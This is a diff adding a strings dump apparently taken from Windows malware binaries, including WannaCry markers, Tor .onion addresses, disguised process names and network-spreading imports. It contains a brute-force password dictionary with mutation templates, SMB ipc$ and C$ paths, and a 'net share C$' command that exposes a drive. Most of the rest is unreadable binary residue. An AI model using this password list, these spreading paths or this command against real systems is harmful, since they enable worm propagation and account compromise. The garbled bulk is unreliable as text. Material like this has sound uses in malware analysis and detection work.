@@ -1,0 +1,1931 @@
+!This program cannot be run in DOS mode.
+RichQZJ
+`.rdata
+@.data
+T$$WRPh
+<Wt!<wt
+RPWSUQ
+RPWSUQ
+RPWSUQ
+RPWSUQ
+RPWSUQ
+RPWSUQ
+D$,WPS
+T$HQUR
+GetModuleFileNameA
+CloseHandle
+WriteFile
+CreateFileA
+SizeofResource
+LockResource
+LoadResource
+FindResourceA
+MoveFileExA
+CreateProcessA
+TerminateThread
+WaitForSingleObject
+GetTickCount
+ExitProcess
+WideCharToMultiByte
+MultiByteToWideChar
+GetProcAddress
+GetLastError
+LoadLibraryA
+CopyFileA
+GetFileAttributesA
+CreateDirectoryA
+KERNEL32.dll
+SetServiceStatus
+ChangeServiceConfig2A
+RegisterServiceCtrlHandlerA
+StartServiceCtrlDispatcherA
+CloseServiceHandle
+OpenServiceA
+OpenSCManagerA
+DeleteService
+StartServiceA
+ControlService
+CreateServiceA
+ADVAPI32.dll
+WS2_32.dll
+NetApiBufferFree
+NetUserEnum
+NETAPI32.dll
+WNetCancelConnection2A
+WNetAddConnection2A
+MPR.dll
+_endthreadex
+strncpy
+sprintf
+_beginthreadex
+__CxxFrameHandler
+printf
+MSVCRT.dll
+_XcptFilter
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_except_handler3
+_controlfp
+GetModuleHandleA
+GetStartupInfoA
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+0@@AAJu
+SVWjA[
+t7KNNf9>t
+H43H 3H
+H83H$3H
+H<3H(3H
+H83H 3H
+H<3H$3H
+H(3H 3H
+H,3H$3H
+H03H(3H
+H43H,3H 3H
+H83H03H$3H
+H<3H4j
+H83H,3H
+H<3H03H
+H43H 3H
+H83H$3H
+H<3H(3H
+H83H 3H
+H<3H$3H
+H(3H 3H
+H,3H$3H
+H03H(3H
+H43H,3H 3H
+H83H03H$3H
+H<3H4j
+H83H,3H
+H<3H03H
+H43H 3H
+H83H$3H
+H<3H(3H
+H83H 3H
+H<3H$3H
+H(3H 3H
+H,3H$3H
+H03H(3H
+H43H,3H 3H
+H83H03H$3H
+H<3H4j
+H83H,3H
+H<3H03H
+H43H 3H
+H83H$3H
+H<3H(3H
+H83H 3H
+H<3H$3H
+H(3H 3H
+H,3H$3H
+H03H(3H
+H43H,3H 3H
+H83H03H$3H
+H<3H4j
+H83H,3H
+H<3H03H
+?vOj@_+
+QQSUVW
+^ j@US
+_^][YY
+Ht4HHt
+tlHt Ht
+~(9~$u
+FP;FTt
+k|_^][Y
+ inflate 1.1.3 Copyright 1995-1998 Mark Adler 
+Qkkbal
+- unzip 0.15 Copyright 1998 Gilles Vollant 
+CloseHandle
+ReadFile
+CreateFileA
+lstrcatA
+lstrcpyA
+DeleteFileA
+MoveFileA
+lstrlenA
+WriteFile
+SetFilePointer
+GetFileAttributesA
+GetTickCount
+LoadLibraryA
+SystemTimeToFileTime
+GetCurrentDirectoryA
+LocalFileTimeToFileTime
+CreateDirectoryA
+SetFileTime
+LocalFree
+GetLastError
+CreateMutexA
+GetComputerNameA
+WaitForSingleObject
+CreateProcessA
+CopyFileA
+WinExec
+FindClose
+FindFirstFileA
+GetTempFileNameA
+GetWindowsDirectoryA
+GetCurrentProcessId
+GetCurrentThreadId
+GetCurrentThread
+SetCurrentDirectoryA
+GetModuleFileNameA
+KERNEL32.dll
+wsprintfA
+USER32.dll
+SetSecurityInfo
+SetEntriesInAclA
+GetSecurityInfo
+ADVAPI32.dll
+??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
+??8std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z
+?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@PBDI@Z
+?_Tidy@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEX_N@Z
+?_C@?1??_Nullstr@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPBDXZ@4DB
+?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@PBDI@Z
+?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@II@Z
+??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
+?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@II@Z
+?npos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@2IB
+MSVCP60.dll
+memcmp
+??1exception@@UAE@XZ
+?what@exception@@UBEPBDXZ
+strlen
+__CxxFrameHandler
+memcpy
+_strlwr
+malloc
+realloc
+memset
+strrchr
+strcpy
+fwrite
+fclose
+sprintf
+strchr
+_purecall
+memmove
+??0exception@@QAE@ABV0@@Z
+??0exception@@QAE@ABQBD@Z
+_CxxThrowException
+strcat
+calloc
+strcmp
+strncpy
+??2@YAPAXI@Z
+_mbsstr
+MSVCRT.dll
+??1type_info@@UAE@XZ
+_XcptFilter
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_except_handler3
+_controlfp
+WS2_32.dll
+URLDownloadToFileA
+urlmon.dll
+DeleteUrlCacheEntry
+WININET.dll
+GetAdaptersInfo
+iphlpapi.dll
+GetModuleHandleA
+GetStartupInfoA
+_strnicmp
+.?AVexception@@
+memory
+NVIDIA
+Amazon
+360Safe
+Rising
+Tencent
+Mozilla
+Google
+Global\{
+9cc53f993e62ae52c62490e3e2f7bc667fa40ed3362108bc9d53501c195b7d8ab254beba95baa7244f149a66e8e2b5934f55f55c90e773909e20b3c68230e70c1a845824b904075363f83a13f22429ba92bd0036b18b5cd042105735a87e1d7127c7a6328ec7764194ad7a8e237b9ea8220299bebe7be8cb45fced0d3927c0f7
+incompatible version
+buffer error
+insufficient memory
+data error
+stream error
+file error
+stream end
+need dictionary
+invalid distance code
+invalid literal/length code
+invalid bit length repeat
+too many length or distance symbols
+invalid stored block lengths
+invalid block type
+incomplete dynamic bit lengths tree
+oversubscribed dynamic bit lengths tree
+incomplete literal/length tree
+oversubscribed literal/length tree
+empty distance tree with lengths
+incomplete distance tree
+oversubscribed distance tree
+incorrect data check
+incorrect header check
+invalid window size
+unknown compression method
+%s%s%s
+EVERYONE
+127.0.0.1
+tor.exe
+lsass.bin
+%s\%s\%s
+TaskHost
+taskhosts.exe
+ftp://
+https://
+http://
+taskhcst.exe
+mnses7nxf743znk7.onion
+r5x6sdigdz4q7f6q.onion
+sw7xmbms2ivmt5og.onion
+.?AVtype_info@@
+!This program cannot be run in DOS mode.
+Gl^AH1^
+Gm^2Gl^
+Gl^EAj^
+Gl^Rich
+`.rdata
+@.data
+@4+G4t
+q89p8t
+V,YYG;~
+tlHt Ht
+~(9~$u
+FP;FTt
+k|_^][Y
+=j&&LZ66lA??~
+}{))R>
+f""D~**T
+V22dN::t
+o%%Jr..\$
+&&Lj66lZ??~A
+99rKJJ
+==zGdd
+""Df**T~
+;22dV::tN
+$$Hl\\
+C77nYmm
+%%Jo..\r
+>!KK
+55j_WW
+&Lj&6lZ6?~A?
+~=zG=d
+"Df"*T~*
+2dV2:tN:
+x%Jo%.\r.
+t>!K
+a5j_5W
+ggV}++
+Lj&&lZ66~A??
+bS11*?
+Xt,,4.
+RRvM;;
+MMfU33
+PPxD<<%
+Bc!! 0
+~~zG==
+Df""T~**;
+dV22tN::
+xxJo%%\r..8$
+tt>!
+pp|B>>q
+aaj_55
+UUPx((
+='9-6d
+_jbF~T
+11#?*0
+,4$8_@
+t\lHBW
+QPeA~S
+>4$8,@
+p\lHtW
++HpXhE
+T[$:.6
+,4$8'9-6:.6$1#?*XhHpSeA~NrZlE
+Sbt\lH
+QeFbF~TiKwZ
+4$8,9-6'.6$:#?*1hHpXeA~SrZlN
+SbE\lHtQeF
+F~TbKwZi
+$8,4-6'96$:.?*1#HpXhA~SeZlNrSbE
+lHt\eF
+Q~TbFwZiK
+8,4$6'9-$:.6*1#?pXhH~SeAlNrZbE
+SHt\lF
+QeTbF~ZiKw
+ inflate 1.1.3 Copyright 1995-1998 Mark Adler 
+Qkkbal
+- unzip 0.15 Copyright 1998 Gilles Vollant 
+CloseHandle
+GlobalFree
+GetProcAddress
+LoadLibraryA
+GlobalAlloc
+SetCurrentDirectoryA
+GetCurrentDirectoryA
+GetFileAttributesA
+SetFileTime
+WriteFile
+SetFilePointer
+ReadFile
+GetFileSizeEx
+CreateFileA
+InitializeCriticalSection
+DeleteCriticalSection
+GetFileSize
+LeaveCriticalSection
+EnterCriticalSection
+SizeofResource
+LockResource
+LoadResource
+FindResourceA
+GetModuleFileNameA
+SetErrorMode
+VirtualAlloc
+VirtualFree
+FreeLibrary
+HeapAlloc
+GetProcessHeap
+GetModuleHandleA
+SetLastError
+VirtualProtect
+IsBadReadPtr
+HeapFree
+SystemTimeToFileTime
+LocalFileTimeToFileTime
+CreateDirectoryA
+KERNEL32.dll
+wsprintfA
+USER32.dll
+CryptAcquireContextA
+CryptImportKey
+CryptReleaseContext
+CryptDestroyKey
+CryptDecrypt
+ADVAPI32.dll
+SHELL32.dll
+OLEAUT32.dll
+WS2_32.dll
+iphlpapi.dll
+NETAPI32.dll
+MPR.dll
+strcpy
+memset
+strlen
+memcpy
+__CxxFrameHandler
+??3@YAXPAX@Z
+memcmp
+_except_handler3
+_local_unwind2
+??2@YAPAXI@Z
+sscanf
+strcmp
+__p___argv
+__p___argc
+strrchr
+realloc
+_stricmp
+malloc
+??0exception@@QAE@ABV0@@Z
+??1exception@@UAE@XZ
+??0exception@@QAE@ABQBD@Z
+_CxxThrowException
+calloc
+strcat
+_mbsstr
+MSVCRT.dll
+??1type_info@@UAE@XZ
+_XcptFilter
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_controlfp
+MSVCP60.dll
+GetStartupInfoA
+WANNACRY
+(}:6d*L
+W~!{WV
+Th*5\>Z
+n/{,`i
+inY8U+
+&Microsoft Enhanced RSA and AES Cryptographic Provider
+StartTask
+wcry@2016
+GetNativeSystemInfo
+kernel32.dll
+.?AVexception@@
+incompatible version
+buffer error
+insufficient memory
+data error
+stream error
+file error
+stream end
+need dictionary
+invalid distance code
+invalid literal/length code
+invalid bit length repeat
+too many length or distance symbols
+invalid stored block lengths
+invalid block type
+incomplete dynamic bit lengths tree
+oversubscribed dynamic bit lengths tree
+incomplete literal/length tree
+oversubscribed literal/length tree
+empty distance tree with lengths
+incomplete distance tree
+oversubscribed distance tree
+incorrect data check
+incorrect header check
+invalid window size
+unknown compression method
+%s%s%s
+.?AVtype_info@@
+c.wry0L
+m.wrys
+yBxT#U
+@LFV:=
+C(5Kd~#
+tJYAA.'
+1R7=tG+
+ucdWjb
+Tq;mvE
+[:Go0AI+
+)1c.%O
+s5/6Gy
+l=vNAj
+)LOSpN
+Nk3|_E^
+{r8d4R
+h! 1[z0
+[|L*%[
+ .V)TO$~
+^o-?~[~f
+d;vZ~2
+L1%uQ!=
+@I8KHd
+xL.+rG
+pcZw,-i
+#]%`)Ko
+vQFjFy
+gH>M[XB
+CJ1.'}z
+.I*WD)
+xf^w^-
+.4O6{;
+JcY)BI
+tTSK,`
+i(n2_K1zO
+wMSPs@A
++;O)y"
+!|Bb)+
+8[*SaQ
+Okt4x0
+M}/=S/
+EgW'.0
+$}X)-c&
+GJb}4v
+704A"q
+2E=g3uD]
+gn}lrC
+5Xd_-_
+aX?4O;,
+cs9^qO
+nFuhH!
+`-#QeA
+X<q#H'
+qASp3
+Yg;zRATs
+5?]Vvs
+/Vw&o&
+u0|n.:)]*
+K|P@'6
+{|dSV>
+"$5~3y2M=
+FWU1~EI
+0}G[zX9
+=jqk+B/
+Clr2K6IK
+(^U$0:
+M;x(O!
+CEzhvB
+1sM#[7
+w(c1b[
+O Kg9}t
+WxE#nR
+Rene?7
+o((2kr:
+vIxN //
+>Qt_%}7
+^t\`4B 
+9%rQqKP
+EUO?)"
+"I?z(T
+E*2f2o
+Qj_d#'k
+Ez;L|n
+bV@vS\
+L)0',a
+>j4"wv
+?2+0oRV
+nd#_O 2
+&2O](<
+YsV`q5
+7Jyr(E`
+?s|;Zh/
+wFLVkmk1
+n]olCf0H
+fMt$n&
+=swcV~H
+E=1kv}
+h.xU.:
+el6,x:
+#9e-'\
+W3BpHq:-
+24E^{!
+[4HPUU~R$
+C<e*l>i
+!$tUquA?WD%#a
+j=\~dh
+I4Ub/Q
+O;b !A
+\>VTAd
+}2WFNz
+G{cPkp
+Igtr%3
+wKGA-t:
+JfH9sf
+D!LQo!
+mba/l
+f$F.Cm
+LJd}fk
+y{zRl$
+%f~M?*
+120z\T
+a)X/=pH
+%J%1J
+^5_xbV
+WxVnM8Pm
+1ux'f~
+gqbM1 7
+mY+$bWky
+>Y0\*tgf
+#Nn&g5S(9
+z~O"]v
+O!([(>
+R=z""@t
+2I5J'S)
+A'Oh1r3
+fIxD0
+lbE^*N
+O*3m:9
+`B 9?V
+G}|8pa
+_Ff;;}
+V"[m:z
+mo$UPu
+T<\L<;
+IN^QHG
+ep@`?y
+X%J~*
+/OV-%Z
+$4]g2m
+*HUJQW>
+(MO`-a
+<T~Sw,
+Z6F|"=
+YrE=6J
+\,M>A&
+tT'l`S
+^Ali_f
+3&)fKWxT
+u.wry2L
+5=lAi-?
+KI=zH7
+"x*JviS
+3?h#8x
+Zp~oYY
+*Im?k;+
+YThae.
+o>JV6T
+AV0X=e
+1c!urX
+KC!>f^
+^[(8fn
++K_'`KU&>
+?h--&K<l
+LzR/ni
+I|jb\>#
+Tc#}?Z&
+vM$D"W
+z%o-fD
+"{*mMv`K
+4'IR`y
+wS >5 
+m,Kzg"*
+2L0[&wtN
+`3g8q(
+8,To{#;TE
+v~'=li
+%c\}0ui
+H(c{4R
+nyyQ7 
+s4R9i_&Y
+N-yiZ$
+'QR?l7
+7HufANQ
+[~zcI&bs.
+y.5I)^
+X`S&u<
+^S4f4L
+'lB(aWZd
+[R2xsjm
+h\mGagaF
+k 8=j\1
+!)N<jf
+d j{/9
+UUL-z|
+(9R;,V
+GX:wGLM
+[_a6Af
++Z=(9`Ev
+88}*,^
+7k%9{d"
+WW5bgw
+$HE=*:
+A&Im0m&
+/0bn/,
+)d7bQa
+9ugDNx
+BeXGYe
+]*/w^nf
+nlDmR"
+Vmxt:X
+A.(VDW_W
+.]AS{E
+?K`B5j
+!MIj;a
+lyk`l)
+|<I#r=H
+LIm`WZ
+'n2m\a
+)(,ET&sK
+0FMo=KQ>
+1$bOR~
+9 IW5w
+T(a>,2
+j&lHy(8H
+B:F}ks
+bOaRB'*
+vSR@d-g
+/G3QCPH2
+0.D-C#L(
+}CI\lNn)
+0*3k|7
+W]8BQzN
+hz}nDm'
+;Bo4F8
+!{MQ[`8
+4F[5pG[
+m}w5Y'
+hxOoo{{
+d83_\J{+
+F-.>Sw
+HVR<pT
+:`aL7_3\
+=;(UMa
+=WNCx:]
+/J+Ik@
+`zn_$!D
+$WW3]>
+<3"Mt?=
+wG74f/
+f;iq6eO
+RT!i,v
+h'-u],
+B='rKx
+6'th6R
+qPUu>S
+Gw{1Qt G
+26-{-iO
+a[M]D%
+H&kNRa
+}w.ag2J
+8_MA@%
+VsX+CWg
+:-J8>|
+AN92cl
+=B&olkHw
+$<-~W/
+uxWiJ`
+r$lDVs
+~[Zw<pV
+.F73*/
+AZ}CTe
+Y3=_%f
+$@)YXx
+B~Evgj8
+;oD!'-
+mXp62|
+lH:J9/
+8 ma@uLeO
+E3)3(s
+</1{{Q
+-*6x{\
+p4i,p
+%|0'1(65
+k2#*fVW{%44
+4&q$gY
+F[!Ao.
+8o]#a+>
+|D_-FK:
+{ZfZfe=
+k?44@K!H>!dL1
+Pp&imz
+%R|2%K=
+s- Lz,'I
+ TKQ3N
+FYtV^[
+T/&DdXV
+}`2tOP
+. rQ]Q
+{/m2#b
+w|_'nm'
+{9VK8
+e33e'E
+pI\:uA
+Df\bF:
+j7bL._
+HP=ahg
+z>c x|
+bN)b$-(
+7!Bnk2
+G$N0%3J
+RIH'G4fx
+$J=n7S
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="asInvoker" />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <dependency>
+    <dependentAssembly>
+        <assemblyIdentity
+            type="win32"
+            name="Microsoft.Windows.Common-Controls"
+            version="6.0.0.0"
+            processorArchitecture="*"
+            publicKeyToken="6595b64144ccf1df"
+            language="*"
+        />
+    </dependentAssembly>
+  </dependency>
+  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+    <application> 
+       <!-- Windows 10 --> 
+       <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
+       <!-- Windows 8.1 -->
+       <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
+       <!-- Windows Vista -->
+       <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"/> 
+       <!-- Windows 7 -->
+       <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>
+       <!-- Windows 8 -->
+       <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
+    </application> 
+  </compatibility>
+</assembly>
+PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN
+cowboy
+sparky
+asdfgh
+secret
+bigdog
+yellow
+diamond
+richard
+patrick
+chelsea
+martin
+cheese
+golfer
+matthew
+merlin
+austin
+fucker
+taylor
+corvette
+summer
+hammer
+heather
+ginger
+nicole
+thunder
+computer
+freedom
+biteme
+orange
+amanda
+ashley
+yankees
+dallas
+william
+silver
+maggie
+joshua
+access
+daniel
+pepper
+asshole
+jessica
+sunshine
+michelle
+andrew
+charlie
+george
+hockey
+killer
+batman
+soccer
+robert
+tigger
+thomas
+buster
+ranger
+trustno1
+fuckyou
+hunter
+fuckme
+harley
+jordan
+jennifer
+shadow
+michael
+mustang
+welkome
+bumble
+monkey
+starwars
+qwertyuiop
+princess
+baseball
+football
+letmein
+superman
+passwd
+master
+dragon
+abc123
+server
+1qaz2wsx
+welcome
+qwerty
+passw0rd
+password
+p@ssw0rd
+!@#$%^&*()
+!@#$%^&*(
+!@#$%^&*
+!@#$%^&
+!@#$%^
+abcd1234
+123456!
+12345!
+1234!@#$
+1q2w3e4r!
+1q2w3e4!
+1q2w3e!
+1q2w3e4r
+1q2w3e4
+1q2w3e
+121212
+666666
+696969
+123123
+654321
+111111
+1234567890
+1234567
+123456789
+12345678
+123456
+administrador
+administrator
+C:\%s\%s
+WINDOWS
+lsass.bin
+C:\%s\wodglklsu
+taskhcst.exe
+C:\%s\fff
+C:\%s\wodglslsh
+lsasvs.exe
+%d.%d.%d.%d
+WUpdator
+\\%s\ipc$
+%s!@#$
+%s@20%02d
+%s20%02d!
+%s%02d!
+%s20%02d
+%s%02d
+%s@1234
+%s1234!
+%s1234
+%s@123
+%s123!
+RtlUpcaseUnicodeStringToOemString
+LoadLibrary( NTDLL.DLL ) Error:%d
+ntdll.dll
+KGS!@#$%
+Windows Updator
+svchost.exe
+\\%s\C$\%s\asgregrhehr
+\\%s\C$\%s\%s
+\\%s\C$\%s\ff
+cmd.exe /c "net share C$=C:\"
+shcservice
+Windows SHC Service
+NT LM 0.12
+NTLMSSP
+Data/PK
+Data/Tor/PK
+Data/Tor/geoip|
+HXKmH}}x
+]9@F![
+qy+wY}
+XtZ(X`\
+ZC9|\?Q
+Aa_#;U
+3Khh9,
+Z ZsXcd
+[sCahb
+t)aA#lbA
+F>[di<4Gh
+kuVG3o
+<b:P=]
+?S8b61
+&} ?H(
+&0mN.u
+OTaj)\$,14
+TJch\7
+2vBlm>
+w/c&tO
+&]X6WM
+T\>]#+
+$fB7O?
+Mbj&.)`
+sa04U?
+\,<OT</^ 
+a+O'be~
+$tduci
+tW.,Mv(
+CMakNE
+$.`m>n#
+q{AXX?Gl
+<,q4]iy
+V_+l<(
+er]QX?
+B.:"1|8
+3jYh3l
+I[<Y&"
+IddpgP
+R|i"Ib]7
+5f[Hc6k{
+I};HeB
+/rbR(n
+DF:?W|
+$I<|8/
+Oh(^5s"R$N>kgR.
+\&7/t"*
+][MP&@
+f\' Mi
+%(2$nvP
+aKB{ 2
+LhOwu}2
+L}wG"2"GAk
+y4iJR7
+@#GO""#%
+DDFt(<
+H[wuX[
+; ZM\s
+GQMF?E
+A$.{(g
+>b9HdP{
+mm5x@cWd
+:&{~i:
+#{IR$28
+^%"#yn
+!I[<qc
+0,{X.R$
+6#;-TW
+$j;'s?<<r
+gr-B#7
+$iW9$-
+)Zx]hD,
+WAMhd5=mg
+=Jd$<JjN
+^dD<M-c
+$fPT=|RPT
+XOny'9
+:lwyw6
+aC$lsCD
+J"nT:'
+$ILg'u^ 
+};]^Dt
+{Q@DI*
+pD{BRl
+1>!i22x4
+9iv @g
+$228FV
+A]Udm]U
+1lR(n|;
+|[%hR(
+DF:o8Ge
+ebmNUXT"
+6cOp0L
+;.*f
+8fbbm^
+DNr:og
+vSeB2$
+S%HB#]
+`$.%@@
+FxuNCTWvG2BB
+4EN bw
+[DIVn=~
+8VDFV3
+/2$.e?N
+gN[\ON
+}738nhqk
+{D?_Gy<
+1!k9&d@
+=[;Fa-
+x63c73\
+&Hh?>W
+r>s2wN
+}jFDF2
+ H~;(l
+q}}g0L"#
+%229ct
+8U&$J23
+e;yQw
+p:1|#1^
+wUDd{2
+\0l$\0&"B
+bm{FO_
+}Nc$[K
+{~*#q(
+@wMf\z
+THEW{
+}ye_rh
+t:8P|wU
+f3#qHs
+Bz1GNe
+K/4CHo
+waC.,)
+~e-\tU
+Hw]0eP{
+Oi|(qM
+5q4eP<
+{:f^,J
+=akx{@
+_,M'NR
+HIgR^Nx
+"+_>,]/
++(' R8
+8"0=N*
+`%]w3
+^J!M/%PEq
+-[~P4_
+jr-&(b3
+WL`%<s
+:>gx3\y?
+yRME`%
+-8N`21
+*x@H+x
+-^7uL[
+T2a+Q2aR
+>b3KsH
+J#m%J#M
+B i%-u
+IXI?gn
+ZeS4Kq_6
+.Niv1)L
+pGzEMx
+.&(fcW
+g,Gk>v3k
+=M@J*W@
+lRzy%A
+lwda1P
+I`:G<(
+|=m2lkq
+xK;G<(
+8a;(>hk
+(P\$C`
+!%C!@@
+"%7c][
+)wRPt'
+[po|JnA
+`eNCoK
+yW_z1Q
++W|eU,
++~|MvJ_
++<|vM~
+JpdDZ5N
+P@xP-=*
+tCS4|QkE
+1HRz\Q
+6q8\Rg>
+Tp9K3-aVdi
+XdWB=L
+F@MUoF<
+mb-r$V{
+3+su+*
+E"y9.J8b
+VVlK;+
+*R):\A
+Jz&<kb
+"@%0 *J
+`M.9nK
+@J.f[s
+2G<+(`6
+jC6gl*
+,-{6Qs
+@D_CJ_
+ZW)q5X
+<IiX7
+ROnO,Z!
+bWT,6x
+!`*O{n~
+j>=~m@
+RFeUUM
+hz<uIB
+cLAm-%`*
+v`io4A
+uMm];h
+_~~9X|
+{^_~z9@qp8q
+YU4(5j
+=Y'!X|
+zU-]6 5
+7G, \\
+ijWBHj7
+w#-<0g
+v7/rzR
+5g02fKB+
+bv{s7w
+")xJ`R
+?ED.a.
+u6rg]=
+x#OK@Dv
+Qr1JT>.2$
+bRS~\)1
+2SU5j3
+,C2V5r
+nw5g$.B
+7%^%CnJ
+F"Nw$%
+{!)#
+ej$V^R
+c>:3)s
+%d$<Mq
+*YY%0t
+M?RyL?x~
+s+_OH,
+ KuU=@
+}3ai9ai
+`\{K379&
+&W+suoS
+S"&,5}G
++=5Cj
+8p#b96
+i]{1jH
+bv-<sZl
+ ~qFg4
+Y^t5"&e
+=d:C#j
+@!!C #a
+!$dI>pA-F8
+\]K"\]OwC
+bXTOJ;EF
+1@CB1@'
+q8SBWI
+*Yr@a$v C
+YQqF-
+6ws%dI
+kP m'5$d
+O@!*7wt1
+bd~\$?
+]rug"&e^
+m*"V"NL
+\!xnH(x.
+u|#1R"=
+'?B^%y
+_]bkZ{
+_:tWd
+F9*b`B
+6.H:Zd
+b9l[,?,@E
+cxHFGE
+J>[_yn@T
+##b9z}z|
+NQcd bc
+rTfd_WW
+vtgYMJ"
+Fj"(/O
+0_A_>
+j>r'ad}
+zz6"Rk
+bv7V).
+\HIu\,
+(4=>wB
+q!gl;|
+PqFN&vX
+X>58$F
+]7_H^cb/
+d.-k8D72
+cgW#RR
+"W@LJ^Ul
+ .'6^B
+;5w"wjb
+$vdD)Q
+Q1#N,)
+2B[b1#4
+72yaJdFC
+c:_{~\1?
+j!( R8
+:bT6C~
+BjGoiF"T
+C>C/VjI
+RQ7BcZ
+&1%J.2A
+aeqHxr
+q>ID6J
+I9"+fu
+{C@B+o
+C3j8,F
+E)t,H|q\T
+Iyk{GF$
+gPl+=")
+W )gzW-}
+L%%xHDi
+r_Y+ I06n
+no4tpQ2t
+$q1f&H\
+!+HvyN
+(=?wB*
+>tT}?@^
+]G;f+Y
+4@6)oX
+K'"JDp
+~?#@w2D
+6B R'>
+!*_\KT
+dq(_#)/5
+4QF.j;g
+~w@Zwk
+6,[Gv"
+(A@ V7
+;0?wD,
+[N!H<G_
+#j8ZV;H
+g3Ry|?v;
+H:&BPY
+A"\WJ\
+D]2o~
+D{g;pG
+$q#4?/R
+4QA.d^
+6EDX2Z
+,~g6("
+MJ4/K7S,k$
+DFBhGx
+fD_qA&b
+!b;Z\9
+%t'C2W
+q0jKFf]
+HRv,}}
+fLE\l#
+DR^W&R
+Bpo\[y )
+v48ThS
+nI{8 )
+&iD.jnc<
+[Bz51xCo
+A,Q2pMe
+8?}z%R
+Y0z\d\{
+ewI UW
+X/@9q:
+by;K$M{
+_mOg )g0
+H:VO_2 
+`6D5%f.2D]
+I92dhA&
+ny )/H
+d{nG K
+dTw{dT
+UDzySy
+U2&N,\2
+Wj"V7|W/eK
+DT>"3
+gv`!3p
+Em+="}X:
+1"eKn 
+f2Z;%Z
+I9/3=v
+;&lR5q
+ak/}@.
+Ye @r_
+U7%jVw
+("5p"^xJT]
+8A.8)k
+#"k6o?
+M3zNg 5
+a?TT='
+7M5 I\
+\T?6,S
+%sQsh[
+W/[BW/
+5MVH)a+
+3"*ok]
+CvKD*j
+[gu;P1c]Y
+De3lhM
+.F/[9P
+Ppl#*o
+AfbB#)gJ
+_N"vIg
+>W8")
+CB?Ta$6I
+( qTWX%
+e|tO80
+\aAFqr
+[8PwC
+8$bW('H
+CdCJ ~q
+"v5N5s"5 
+T`1HDas
+rT=c~~
+4`eCGr
+5`h0Gc
+8{rh(
+AN;:l4
+b!Qv5Q
+Q)D)cl\
+Oa]~dD)#
+p'rGkT
+?,Cn=a
+jdY"sLoK
+L&6IT)<
+#~T!1D3
+9R2&3GF^
+8zx3X)
+#QeCq("
+rwqh%fI
+=Q5T]UV
+@)#*!*V
+8M`/!J
+|$[kseR"r4D
+(W{(..rJ
+cVT8JE8Q
+PeCsrl"q
+)7v }?
+wt8 u5.
+{T>sF:
+P1O|m"
+?w t"uU
+WD\>[Y
+Gn}/sr
+=QUCy4
+##\]~V@
+7Zjx?w
+Af!<qdz
+W{&u3G
+2Z$A6G
+9*}X69`
+UIGRvUx
+(|!h\Owu}
+/V""P
+{tpV"
+(G5Dm
+#YT82
+a@z}VK
+tYC#l
+9QWC\Zd
+/#r,(,
+QUCs~Q 
+or\*gU
+PWC;{;
+xQI@2^U
+r6|:=\|r
+-gQ;>*.
+z$6'D
+yxtDAh
+.!=qf6
+n24K/
+Qx}/u0
+I8*[[x
+LV&:.
+$c\fC 
+>"g!<s
+ITewW>
+UENA^w
+>?^>H0
+&K;;u 
+j>D u5
+eEOu5}
+u5\G} 
+a[x%42w
+IG69O>
+H_H:"{
+s-<h?j
+.{"PUC?
+r8(ZG7
+~ )_%;
+t<W/:|
+m[|NN= )_%
+d[PSf[
+Hp"+#7c
+gUg# )
+q+\>H5
+#P"*p
